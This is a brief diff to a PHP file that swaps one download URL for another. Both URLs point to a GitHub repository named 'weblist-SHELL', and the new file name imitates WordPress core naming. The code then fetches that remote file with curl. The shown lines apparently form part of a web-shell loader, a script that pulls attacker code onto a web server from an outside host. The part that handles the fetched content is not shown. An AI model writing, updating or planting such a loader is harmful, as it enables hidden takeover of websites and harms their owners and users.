@@ -1,5 +1,5 @@
 <?php
-$url = "https://github.com/rendihidayat683/weblist-SHELL/raw/refs/heads/main/better-call-admin.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/2025wp-inc-vn.php";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
